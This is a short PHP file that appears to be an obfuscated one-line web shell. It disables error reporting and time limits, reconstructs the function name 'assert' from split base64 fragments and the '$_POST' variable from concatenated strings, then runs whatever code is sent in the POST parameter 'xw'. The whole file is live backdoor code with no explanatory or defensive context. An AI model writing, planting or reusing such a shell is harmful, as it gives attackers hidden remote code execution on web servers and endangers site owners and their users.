<?php  
error_reporting(0);set_time_limit(0);$a=base64_decode("Y"."X"."N"."z"."Z"."X"."J"."0");$a(@${"_P"."O"."S"."T"}[xw]);?>